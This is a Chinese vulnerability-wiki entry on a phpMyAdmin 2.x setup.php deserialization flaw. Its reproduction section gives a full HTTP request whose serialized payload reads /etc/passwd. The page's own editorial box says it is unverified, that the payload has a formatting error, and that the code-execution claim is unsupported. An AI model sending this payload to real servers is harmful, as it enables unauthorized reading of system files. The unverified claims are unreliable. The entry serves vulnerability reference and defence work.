---
source: "hatch 补库批 20260928"
title: "（WooYun-2016-199433）Phpmyadmin scripts/setup.php 反序列化漏洞"
product: "phpMyAdmin"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "phpMyAdmin 2.x 且旧 scripts/setup.php 可访问；精确版本与鉴权限制待核验"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-766ad89e824480a92c5ce773"
entity_id: "ve-766ad89e824480a92c5ce773"
schema_version: "1"
---

# （WooYun-2016-199433）Phpmyadmin scripts/setup.php 反序列化漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：phpMyAdmin 2.x 且旧 scripts/setup.php 可访问；精确版本与鉴权限制待核验
- 证据范围：与66/76同一 setup.php payload，提供 Vulhub 原文定位；序列化 source 后逗号导致数据格式错误，不能按现文有效解析

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 只展示文件读取，声称任意代码执行缺少对应链条
- 图片引用有重复残尾
- 版本2.x过宽，应回源补边界

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

一、漏洞简介
------------

phpmyadmin
2.x版本中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码。

二、漏洞影响
------------

phpmyadmin 2.x

三、复现过程
------------

发送如下数据包，即可读取`/etc/passwd`：

    POST /scripts/setup.php HTTP/1.1
    Host: www.0-sec.org:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 80

    action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}

![1.png](./.resource/WooYun-2016-199433Phpmyadminscripts_setup.php反序列化漏洞/media/rId24.png)Phpmyadminscripts_setup.php反序列化漏洞/media/rId24.png)

参考链接
--------

> https://github.com/vulhub/vulhub/blob/master/phpmyadmin/WooYun-2016-199433/README.zh-cn.md
